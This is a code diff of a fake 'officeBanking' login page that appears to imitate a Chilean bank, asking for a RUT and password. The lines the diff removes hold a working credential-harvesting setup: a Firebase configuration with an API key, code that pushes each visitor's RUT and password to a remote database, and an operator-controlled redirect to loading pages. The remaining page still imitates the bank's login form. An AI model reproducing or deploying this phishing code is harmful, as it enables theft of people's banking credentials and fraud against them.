@@ -60,21 +60,17 @@
       border: none;
       border-radius: 5px;
     }
+    .mensaje-final {
+      border: 2px solid red;
+      padding: 20px;
+      border-radius: 10px;
+      color: red;
+      font-size: 20px;
+      background: white;
+      text-align: center;
+    }
   </style>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
-      authDomain: "formulario-officebanking.firebaseapp.com",
-      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
-      projectId: "formulario-officebanking",
-      storageBucket: "formulario-officebanking.appspot.com",
-      messagingSenderId: "604053438195",
-      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
-    };
-    firebase.initializeApp(firebaseConfig);
-
     function formatoRUT(rut) {
       rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
       if (rut.length > 1) {
@@ -111,42 +107,25 @@
     function enviarFormulario(e) {
       e.preventDefault();
       const rut = document.getElementById("rut").value;
-      const clave = document.getElementById("clave").value;
-
       if (!validarRUT(rut)) {
         alert("RUT inválido");
         return;
       }
-
-      const timestamp = new Date().toLocaleString("es-CL");
-
-      firebase.database().ref("usuarios").push({
-        rut: rut,
-        clave: clave,
-        timestamp: timestamp
-      }).then(() => {
-        firebase.database().ref("modo_asistente").once("value").then((snap) => {
-          const activo = snap.val();
-          if (activo === "activo") {
-            firebase.database().ref("validacion_estado").set(""); // limpiamos por si quedó algo
-            window.location.href = "cargando1.html";
-          } else {
-            window.location.href = "final.html";
-          }
-        });
-      });
+      document.getElementById("formulario").style.display = "none";
+      document.getElementById("mensajeFinal").style.display = "block";
     }
 
     window.onload = () => {
       document.getElementById("rut").addEventListener("input", function () {
         this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
       });
-    }
+    };
   </script>
 </head>
 <body>
   <h2>Ingreso a <span class="banking">officeBanking</span></h2>
-  <form onsubmit="enviarFormulario(event)">
+
+  <form id="formulario" onsubmit="enviarFormulario(event)">
     <input type="text" id="rut" placeholder="RUT" required maxlength="12" />
     <div class="input-container">
       <input type="password" id="clave" placeholder="Contraseña" required maxlength="12" />
@@ -154,5 +133,9 @@
     </div>
     <button type="submit">Ingresar</button>
   </form>
+
+  <div id="mensajeFinal" class="mensaje-final" style="display:none;">
+    Hemos recibido tu solicitud correctamente.
+  </div>
 </body>
 </html>
